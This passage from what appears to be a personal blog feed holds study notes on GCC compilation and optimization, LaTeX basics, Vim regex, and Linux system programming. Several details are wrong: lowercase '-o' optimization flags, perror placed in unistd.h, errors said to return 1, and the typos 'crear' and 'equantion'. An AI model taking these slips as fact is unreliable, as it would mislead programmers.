class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;-o0&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">no</span> <span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-keyword">default</span>: <span class="hljs-keyword">perform</span> <span class="hljs-keyword">no</span> optimization.<br><br> <span class="hljs-string">&#x27;-o1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> require <span class="hljs-keyword">any</span> speed-space tradeoffs, smaller <span class="hljs-keyword">and</span> faster than <span class="hljs-keyword">with</span> <span class="hljs-string">&#x27;-o0&#x27;</span><br><br> <span class="hljs-string">&#x27;-o2&#x27;</span>, it provide maximum optimization <span class="hljs-keyword">without</span> increasing the executable size.<br><br> <span class="hljs-string">&#x27;-o3&#x27;</span>, may increase the speed but increase the size.<br><br> <span class="hljs-string">&#x27;-funroll-loops&#x27;</span>, turns <span class="hljs-keyword">on</span> <span class="hljs-keyword">loop</span>-unrolling.<br><br> <span class="hljs-string">&#x27;-os&#x27;</span>, produce the smallest possible executable.<br></code></pre></td></tr></table></figure><p>The cost of optimization includes greater complexity in debugging, and increased time and memory requirements during compilation.</p><h2 id="6-5-Examples"><a href="#6-5-Examples" class="headerlink" title="6.5 Examples"></a>6.5 Examples</h2><p>The run-time of the program can be measured using the <code>time</code> command in the GNU Bash shell.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>time ./a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><p>Optimizations may not necessarity make a program faster in every case.</p><h2 id="6-6-Optimization-and-debugging"><a href="#6-6-Optimization-and-debugging" class="headerlink" title="6.6 Optimization and debugging"></a>6.6 Optimization and debugging</h2><h2 id="6-7-Optimization-and-compiler-warning"><a href="#6-7-Optimization-and-compiler-warning" class="headerlink" title="6.7 Optimization and compiler warning"></a>6.7 Optimization and compiler warning</h2><p><code>-Wall</code> 应该看成，<code>-W</code> 和 <code>all</code>.</p><h1 id="7-Compiling-a-C-program"><a href="#7-Compiling-a-C-program" class="headerlink" title="7 Compiling a C++ program"></a>7 Compiling a C++ program</h1><p>It compiles C++ source code directly into assembly language.</p><h2 id="7-1-Compiling-a-simple-C-program"><a href="#7-1-Compiling-a-simple-C-program" class="headerlink" title="7.1 Compiling a simple C++ program"></a>7.1 Compiling a simple C++ program</h2><p>Using <code>g++</code> instead of <code>gcc</code>.<br>p56</p><h1 id="9-Troubleshooting"><a href="#9-Troubleshooting" class="headerlink" title="9 Troubleshooting"></a>9 Troubleshooting</h1><p>To display a complete list of options for gcc and its associated program:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -v --<span class="hljs-built_in">help</span></span><br></code></pre></td></tr></table></figure><h1 id="10-Compiler-related-tools"><a href="#10-Compiler-related-tools" class="headerlink" title="10 Compiler-related tools"></a>10 Compiler-related tools</h1><p>GNU archiver <mark>ar</mark>, for creating libaries, and the GNU profiling and coverage testing programs, <mark>gprof</mark> and <mark>gcov</mark>.</p><h2 id="10-1-Creating-a-library-with-the-GNU-archiver"><a href="#10-1-Creating-a-library-with-the-GNU-archiver" class="headerlink" title="10.1 Creating a library with the GNU archiver"></a>10.1 Creating a library with the GNU archiver</h2><p>Combining a collection of object files into a single archive file.</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">$ ar <span class="hljs-literal">cr</span> libhello.<span class="hljs-keyword">a</span> hello_fn.o bye_fn.o<br></code></pre></td></tr></table></figure><p>The option <code>cr</code> stands for “create and replace”. ar does not require a prefix ‘-‘ for its options.</p><p>The first argument ‘libhello.a’ is the name of the library, The remaining arguments are the name of the object files to be copied into the library.</p><p>option <code>t</code>, list the object file in an existing library:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ar t libhello<span class="hljs-selector-class">.a</span><br>hello_fn<span class="hljs-selector-class">.o</span><br>bye_fn.o<br></code></pre></td></tr></table></figure><h2 id="10-2-Using-the-profiler-gprof"><a href="#10-2-Using-the-profiler-gprof" class="headerlink" title="10.2 Using the profiler gprof"></a>10.2 Using the profiler gprof</h2><p>Measuring the performance of a program.</p><p>To use profiling, the program must be compiled and linked with the <code>-pg</code> profiling option:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall -c -pg collatz.c<br><span class="hljs-variable">$ </span>gcc -Wall -pg collatz.o<br></code></pre></td></tr></table></figure><p>If the program consists of more than one source file then the ‘-pg’ option should be used when compiling each source file, and used again when linking the object files to create the final executable.</p><p>The executable must be run to create the profiling data:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>./a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><h2 id="10-3-Converage-testing-with-gcov"><a href="#10-3-Converage-testing-with-gcov" class="headerlink" title="10.3 Converage testing with gcov"></a>10.3 Converage testing with gcov</h2><p>It analyses the number of times each line of a program is executed during a run.</p><p>To find areas of the code which are not used, or which are not exercised in testing.</p><h1 id="11-How-the-compiler-works"><a href="#11-How-the-compiler-works" class="headerlink" title="11 How the compiler works"></a>11 How the compiler works</h1><p>The GNU Compiler, gcc or g++.</p><p>The GNU Assembler, as.</p><p>The GNU Linker, ld.</p><h2 id="11-1-An-overview-of-the-compilation-process"><a href="#11-1-An-overview-of-the-compilation-process" class="headerlink" title="11.1 An overview of the compilation process"></a>11.1 An overview of the compilation process</h2><p>The following stages:</p><pre><code class="hljs">- preprocessing (to expand macros)- compilation (from source code to assembly language)- assembly (from assembly language to machine code)- linking (to create the final executable)</code></pre><p>Can be seen using the ‘-v’ option described earlier.</p><h2 id="11-2-The-preprocessor"><a href="#11-2-The-preprocessor" class="headerlink" title="11.2 The preprocessor"></a>11.2 The preprocessor</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cpp</span> hello.c &gt; hello.i<br></code></pre></td></tr></table></figure><h2 id="11-3-The-compiler"><a href="#11-3-The-compiler" class="headerlink" title="11.3 The compiler"></a>11.3 The compiler</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall -S hello.i<br></code></pre></td></tr></table></figure><h2 id="11-4-The-assembler"><a href="#11-4-The-assembler" class="headerlink" title="11.4 The assembler"></a>11.4 The assembler</h2><p>Convert assembly language into machine code and generate an object file.</p><p>When there are calls to external functions in the assembly source file, the assembler leaves the addresses of the external functions undefined.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span><span class="hljs-keyword">as</span> hello.s -o hello.o<br></code></pre></td></tr></table></figure><h2 id="11-5-The-linker"><a href="#11-5-The-linker" class="headerlink" title="11.5 The linker"></a>11.5 The linker</h2><p>The linking of object files to create an executable.</p><p>The entire linking process is handled transparently by gcc when invoked as follows:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc hello.o<br></code></pre></td></tr></table></figure><h1 id="12-Examining-compiled-files"><a href="#12-Examining-compiled-files" class="headerlink" title="12 Examining compiled files"></a>12 Examining compiled files</h1><h2 id="12-1-Identifying-files"><a href="#12-1-Identifying-files" class="headerlink" title="12.1 Identifying files"></a>12.1 Identifying files</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>file a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><h2 id="12-2-Examining-the-symble-table"><a href="#12-2-Examining-the-symble-table" class="headerlink" title="12.2 Examining the symble table"></a>12.2 Examining the symble table</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nm a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><h2 id="12-3-Finding-dynamically-linked-libraries"><a href="#12-3-Finding-dynamically-linked-libraries" class="headerlink" title="12.3 Finding dynamically linked libraries"></a>12.3 Finding dynamically linked libraries</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>ldd a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>GCC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Adding something to man page</title>
    <link href="/2022/07/22/Adding-something-to-man-page/"/>
    <url>/2022/07/22/Adding-something-to-man-page/</url>
    
    <content type="html"><![CDATA[<p>Adding things into &#x2F;usr&#x2F;local&#x2F;man.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LaTex入门</title>
    <link href="/2022/07/21/LaTeX%E5%85%A5%E9%97%A8/"/>
    <url>/2022/07/21/LaTeX%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-熟悉LaTec"><a href="#第一章-熟悉LaTec" class="headerlink" title="第一章 熟悉LaTec"></a>第一章 熟悉LaTec</h1><p><code>\documentclass&#123;article&#125;</code>声明文档的类型是<code>article</code>.</p><p><code>\begin&#123;document&#125;</code>和<code>\end&#123;document&#125;</code>标识出正文的范围。</p><p>使用<code>\documentclass[UTF8]&#123;ctexart&#125;</code>可显示中文。</p><p><code>\section&#123;&#125;</code>声明了一节的标题.</p><p><code>\[</code>和<code>\]</code>包裹的数学公式。</p><p>LATAX的命令以反斜线<code>\</code>开头。</p><p>严格来说, LaTex不是标记语言，而是主要基于字符串代换的宏语言。</p><h2 id="1-2-从一个例子说起"><a href="#1-2-从一个例子说起" class="headerlink" title="1.2 从一个例子说起"></a>1.2 从一个例子说起</h2><h3 id="1-2-2-从提纲开始"><a href="#1-2-2-从提纲开始" class="headerlink" title="1.2.2 从提纲开始"></a>1.2.2 从提纲开始</h3><p><code>%</code>开头的是注释。</p><p>单个换行并不会使文字另起一段。</p><p>LaTex会忽略每行开始的所有空格。</p><p><code>\footnote&#123;&#125;</code>脚注命令。花括号内的部分是命令的参数，也就是脚注的内容。</p><p><code>emph</code>命令改变字体形状，表示强调。</p><p><code>quote</code>环境，以<code>\begin&#123;quote&#125;</code>和<code>\end&#123;quote&#125;</code>为起止位置。</p><p><code>begin&#123;&#125;</code>命令的参数是环境？</p><p><code>abstract</code>环境，<code>begin&#123;abstract&#125;</code>.</p><p>分组限定了声明的作用范围，一个LaTex环境自然就是一个分组。</p><p>LaTex环境的一般格式:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">\<span class="hljs-keyword">begin</span>&#123;环境名&#125;<br>...<br>\<span class="hljs-keyword">end</span>&#123;环境名&#125;<br></code></pre></td></tr></table></figure><p>带参数或可选参数的环境:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">\<span class="hljs-keyword">begin</span>&#123;环境名&#125;[可选参数]其他参数<br>...<br>\<span class="hljs-keyword">end</span>&#123;环境名&#125;<br></code></pre></td></tr></table></figure><p>定理环境，是一类环境，需在导言区做定义:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\newtheorem</span><span class="hljs-template-variable">&#123;thm&#125;</span><span class="hljs-template-variable">&#123;定理&#125;</span><br></code></pre></td></tr></table></figure><p>最后一个花括号<code>&#123;&#125;</code>是可选参数，也就是名字。</p><p>使用:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">\<span class="hljs-keyword">begin</span>&#123;thm&#125;[勾股定理]<br>...<br>\<span class="hljs-keyword">end</span>&#123;thm&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-5-遭遇数学公式"><a href="#1-2-5-遭遇数学公式" class="headerlink" title="1.2.5 遭遇数学公式"></a>1.2.5 遭遇数学公式</h3><p>最简单的方法, 使用<code>$...$</code>:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>+b$</span><br></code></pre></td></tr></table></figure><p>称<code>行内公式(inline formula)</code>.</p><p>“列表公式”使用<code>equation</code>环境:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;equation&#125;<br>  a(b+<span class="hljs-keyword">c</span>) <span class="hljs-operator">=</span> ab + ac<br>\<span class="hljs-keyword">end</span>&#123;equantion&#125;<br></code></pre></td></tr></table></figure><p>键盘上没有的符号需要使用命令来输入。</p><p>上标结构:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AB</span>^<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>下标结构:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">AB_2<br></code></pre></td></tr></table></figure><p>参数是多个字符就是用花括号<code>&#123;&#125;</code>.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>^&#123;<span class="hljs-number">10</span>&#125;<br></code></pre></td></tr></table></figure><p>角度的符号使用上标表示:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>^\circ<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h3 id="1-2-6-使用图表"><a href="#1-2-6-使用图表" class="headerlink" title="1.2.6 使用图表"></a>1.2.6 使用图表</h3><h4 id="插图"><a href="#插图" class="headerlink" title="插图"></a>插图</h4><p>两种方式:</p><pre><code class="hljs">1. 插入事先准备好的图片2. 使用LaTex代码直接在文档中画图</code></pre><p>大部分情况都是使用插入外部图片的方式。</p><p>使用<code>\usepackage</code>引入宏包, 插入图片使用<code>graphicx</code>宏包。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\usepackage</span><span class="hljs-template-variable">&#123;graphicx&#125;</span><br></code></pre></td></tr></table></figure><p><code>figure</code>环境，即浮动体环境。</p><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><p>使用<code>tabular</code>环境确定表格的行、列对齐模式和表格线。</p><p><code>tabular</code>环境有一个参数。</p><h3 id="1-2-7-自动化工具"><a href="#1-2-7-自动化工具" class="headerlink" title="1.2.7 自动化工具"></a>1.2.7 自动化工具</h3><p>使用<code>\bibliographystyle</code>声明参考文献的格式。</p><p>使用<code>\bibliography</code>命令要求打印出参考文献列表.</p><p>使用<code>BIBTEX</code>处理参考数据库，即<code>.bib</code>文件：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">@ARTICLE</span><span class="hljs-template-variable">&#123;quanjing,</span><br><span class="hljs-template-variable">  author = &#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  publisher = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  title = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  journal = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  year = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  volume = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  number = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure><p><code>BIBTEX</code>是一个专用于处理LATEX文档文献列表的程序。</p><p>引用文献的方法:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">\<span class="hljs-selector-tag">cite</span>&#123;name&#125;<br></code></pre></td></tr></table></figure><p>用<code>lable</code>定义的标签也能被引用。</p><h1 id="第二章-组织你的文本"><a href="#第二章-组织你的文本" class="headerlink" title="第二章 组织你的文本"></a>第二章 组织你的文本</h1><h2 id="2-1-文字与符号"><a href="#2-1-文字与符号" class="headerlink" title="2.1 文字与符号"></a>2.1 文字与符号</h2>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Practical Vim Notes</title>
    <link href="/2022/07/20/Practical-Vim-Notes/"/>
    <url>/2022/07/20/Practical-Vim-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第12章"><a href="#第12章" class="headerlink" title="第12章"></a>第12章</h1><p><code>\c</code>之前的模式忽略大小写。</p><p><code>\x</code>代表完整的字符集[0-9a-fA-F]</p><p><code>&lt;</code>和<code>&gt;</code>用于匹配单词的边界。</p><p><code>\_s</code>匹配空白字符或换行符。</p><p><code>%()</code>非捕获型括号。</p><p><code>\zs</code>标志匹配的起始，<code>\ze</code>标志匹配的结束。类似于perl中的环视。</p><p>与Perl正则语法的对比<code>:h perl-patterns</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux System Programming</title>
    <link href="/2022/07/18/Linux-System-Programming/"/>
    <url>/2022/07/18/Linux-System-Programming/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-入门和基本概念"><a href="#第一章-入门和基本概念" class="headerlink" title="第一章 入门和基本概念"></a>第一章 入门和基本概念</h1><h2 id="1-2-API和ABI"><a href="#1-2-API和ABI" class="headerlink" title="1.2 API和ABI"></a>1.2 API和ABI</h2><h3 id="1-2-2-ABI"><a href="#1-2-2-ABI" class="headerlink" title="1.2.2 ABI"></a>1.2.2 ABI</h3><p>ABI和体系结构紧密联系，绝大多数ABI表示了机器级概念.</p><p>通常通过机器体系结构名称来称呼这些ABI，如Alpha或x86-64。</p><p>ABI是操作系统和体系结构共同提供的功能.</p><h2 id="1-4-Linux编程的概念"><a href="#1-4-Linux编程的概念" class="headerlink" title="1.4 Linux编程的概念"></a>1.4 Linux编程的概念</h2><h3 id="1-4-1-文件和文件系统"><a href="#1-4-1-文件和文件系统" class="headerlink" title="1.4.1 文件和文件系统"></a>1.4.1 文件和文件系统</h3><p>在Linux内核中，文件用一个整数表示(C语言的int类型), 称文件描述符.</p><p>普通文件包含以字节流(即线性数组)组织的数据.</p><p>索引节点inode(information node). 包含和文件关联的元数据，其中包括文件数据在磁盘上的存储位置.</p><p>索引节点是UNIX文件在磁盘上的实际物理对象，也是在Linux内核中通过数据结构表示的概念实体.</p><h4 id="目录和链接"><a href="#目录和链接" class="headerlink" title="目录和链接"></a>目录和链接</h4><p>目录是可读名称到索引编号之间的映射.</p><p>名称和索引节点之间的配对称为链接(link).</p><p>可以把目录看作普通的文件，其区别在于它包含文件名到索引节点的映射. 内核1直接通过该映射把文件名解析为索引节点.</p><p>Linux内核也采用缓存(denty cache)存储目录的解析结果，以便后续访问更快地提供查询结果.</p><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>当不同名称的多个链接映射到同一个索引节点时，我们称该链接为硬链接(hard link).</p><p>每个索引节点包含链接计数(link count)， 记录该索引节点在文件系统中的链接数，只有当link count is 0, 索引节点及其相关数据才会从文件系统中真正删除。</p><h5 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h5><p>Symbolic links.</p><p>为了实现跨文件系统链接。</p><p>有自己的索引节点和数据块.</p><h5 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h5><p>Special file. 指以文件来表示的内核对象。特殊应该是指访问方式特殊.</p><p>Linux只支持四种special file:</p><pre><code class="hljs">1. 块设备文件2. 字符设备文件3. 命名管道4. UNIX域套接字</code></pre><p>字符设备作为线性字节队列来访问。</p><p>块设备作为字节数组来访问。</p><p>命名管道(named pipes), 通过FIFO特殊文件来访问.</p><p>套接字(socket)使用socket文件进行交互.</p><h4 id="文件系统和命名空间"><a href="#文件系统和命名空间" class="headerlink" title="文件系统和命名空间"></a>文件系统和命名空间</h4><p>有些操作系统会把不同的磁盘和驱动划分为独立的命名空间。<br>添加和删除文件系统的操作为挂载(mounting)和卸载(unmounting).</p><p>Linux系统必定有个根文件系统.</p><p>块设备的最小寻址单位是扇区(sector).</p><p>文件系统中的最小逻辑寻址单元是块(block), 其大小一般是2的指数倍乘以扇区大小。</p><p>页(page)是内存的最小寻址单元.</p><h3 id="1-4-2-进程"><a href="#1-4-2-进程" class="headerlink" title="1.4.2 进程"></a>1.4.2 进程</h3><p>进程不仅包含目标代码，它还包括数据、资源、状态和虚拟计算机。</p><p>在Linux下，最常见的格式称”可执行和可链接的格式(Executable and Linkable Format, ELF)”.</p><p>C标准规定了C变量的默认值为0.</p><p>bss的取名存在历史遗留原因，是block started by symbol.</p><p>进程资源以及该进程相关的数据和统计保存在内核中该进程的进程描述符中.</p><h4 id="进程层次结构"><a href="#进程层次结构" class="headerlink" title="进程层次结构"></a>进程层次结构</h4><p>在Linux中，进程树的根是第一个进程，称为init进程，通常为init程序。</p><p>如果父进程先于子进程终止，内核会将init进程指定为它的父进程。</p><p>在Linux内核中，uid是用户的唯一标识.</p><h3 id="1-4-4-权限"><a href="#1-4-4-权限" class="headerlink" title="1.4.4 权限"></a>1.4.4 权限</h3><p>特殊文件忽略执行权限.</p><p>对于目录，读权限表示允许列出目录的内容，写权限表示允许在目录中添加新的链接，执行权限表示允许在路径中输入和使用该目录.</p><h3 id="1-4-5-信号"><a href="#1-4-5-信号" class="headerlink" title="1.4.5 信号"></a>1.4.5 信号</h3><p>信号一般用于通知进程发生了某些事件，如段错误或用户按下Ctrl+C。</p><p>每个信号是由一个数值常量和文本名表示。如SIGHUP用于表示终端挂起，在x86-64体系结构上值为1.</p><h3 id="1-4-6-进程间通信"><a href="#1-4-6-进程间通信" class="headerlink" title="1.4.6 进程间通信"></a>1.4.6 进程间通信</h3><p>Linux支持的进程间通信机制包括管道，命名管道，信号量，消息队列，共享内存和快速用户空间互斥。</p><h3 id="1-4-8-Error-Handling"><a href="#1-4-8-Error-Handling" class="headerlink" title="1.4.8 Error Handling"></a>1.4.8 Error Handling</h3><p>Special variable，errno.</p><p>函数通过特殊返回值(通常为1)来通知函数调用发生错误.</p><p>变量errno用于定位错误的原因。</p><p>errno定义在&lt;errno.h&gt;.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> errno;<br></code></pre></td></tr></table></figure><h4 id="把errno值转化为对应的文本"><a href="#把errno值转化为对应的文本" class="headerlink" title="把errno值转化为对应的文本"></a>把errno值转化为对应的文本</h4><p>Using the function <code>perror()</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">perror</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span></span>;<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-2-File-I-x2F-O"><a href="#CHAPTER-2-File-I-x2F-O" class="headerlink" title="CHAPTER 2 File I&#x2F;O"></a>CHAPTER 2 File I&#x2F;O</h1><p>最简单及最常见的文件交互方式–系统调用。</p><p>内核会为每个进程维护一个打开文件的列表，称文件表(file table)</p><p>每个Linux进程可达开得文件数是有上限的.</p><p>每个进程至少包括三个文件描述符: 0, 1, 2</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">0</span>表示<span class="hljs-keyword">stdin</span><br><span class="hljs-number">1</span>表示<span class="hljs-keyword">stdout</span><br><span class="hljs-number">2</span>表示<span class="hljs-keyword">stderr</span><br></code></pre></td></tr></table></figure><p>几乎任何能够读写的东西都可以通过文件描述符来访问.</p><p>关于文件的读写都要判断文件是否成功打开。</p><h3 id="2-1-2-新建文件的所有者"><a href="#2-1-2-新建文件的所有者" class="headerlink" title="2.1.2 新建文件的所有者"></a>2.1.2 新建文件的所有者</h3><p>文件所有者的uid即创建该文件的进程的有效uid.</p><p>文件所属组默认情况下使用创建进程的有效gid.</p><h3 id="2-1-3-文件权限"><a href="#2-1-3-文件权限" class="headerlink" title="2.1.3 文件权限"></a>2.1.3 文件权限</h3><p>创建文件时，参数mode提供了新建文件的权限.</p><h3 id="The-creat-function"><a href="#The-creat-function" class="headerlink" title="The creat() function"></a>The creat() function</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">crear</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">int</span> mode)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">open</span> <span class="hljs-params">(name, O_WRONLY | O_CREAT | O_TRUNC, mode)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有数据可读和到达数据结尾是两个不同的概念。</p><h3 id="Reading-All-the-Bytes"><a href="#Reading-All-the-Bytes" class="headerlink" title="Reading All the Bytes"></a>Reading All the Bytes</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata">ssize_t <span class="hljs-keyword">ret</span>;<br><br><span class="hljs-keyword">while</span> (len != 0 &amp;&amp; (<span class="hljs-keyword">ret</span> = <span class="hljs-keyword">read</span> (fd, buf, len)) != 0) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">ret</span> == -1) &#123;<br>                <span class="hljs-keyword">if</span> (errno == EINTR)<br>                        <span class="hljs-keyword">continue</span>;<br>                perror (<span class="hljs-string">&quot;read&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        len -= <span class="hljs-keyword">ret</span>;<br>        buf += <span class="hljs-keyword">ret</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-3-Nonblocking-Reads"><a href="#2-2-3-Nonblocking-Reads" class="headerlink" title="2.2.3 Nonblocking Reads"></a>2.2.3 Nonblocking Reads</h3><p>当以非阻塞模式读文件时，必须检查<code>EAGAIN</code>, 否则可能因为丢失数据导致严重后果.</p><h3 id="2-2-5-read-调用的大小限制"><a href="#2-2-5-read-调用的大小限制" class="headerlink" title="2.2.5 read()调用的大小限制"></a>2.2.5 read()调用的大小限制</h3><p>在32位系统上，size_t和ssize_t对应的C类型通常是unsigned int和int.</p><h2 id="2-3-Writing-with-write"><a href="#2-3-Writing-with-write" class="headerlink" title="2.3 Writing with write()"></a>2.3 Writing with write()</h2><h3 id="2-3-6-write-行为"><a href="#2-3-6-write-行为" class="headerlink" title="2.3.6 write()行为"></a>2.3.6 write()行为</h3><p>内核把写操作推迟到系统空闲时期，批处理很多写操作，称延迟写.</p><p>为了保证数据按时写入，内核设置了”最大缓存时效(maximum buffer age)”</p><h2 id="2-4-同步I-x2F-O"><a href="#2-4-同步I-x2F-O" class="headerlink" title="2.4 同步I&#x2F;O"></a>2.4 同步I&#x2F;O</h2><p>牺牲性能换来同步操作，控制数据何时写到磁盘。</p><h3 id="2-4-1-fsync-and-fdatasync"><a 